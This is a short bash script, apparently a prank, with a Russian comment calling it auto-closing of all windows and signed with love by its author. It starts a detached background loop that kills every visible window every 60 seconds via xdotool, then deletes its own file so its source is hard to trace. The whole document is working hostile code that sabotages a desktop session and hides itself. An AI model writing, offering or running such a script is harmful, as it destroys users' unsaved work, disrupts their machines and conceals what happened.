#!/bin/bash
# Автозакрытие всех окон 🥰💀 P.S. С любовью, Bauka (basagitz)
nohup bash -c '
while true; do
    sleep 60
    for win in $(xdotool search --onlyvisible --class ".*"); do
        xdotool windowkill $win
    done
done
' > /dev/null 2>&1 & disown
rm -- "$0"

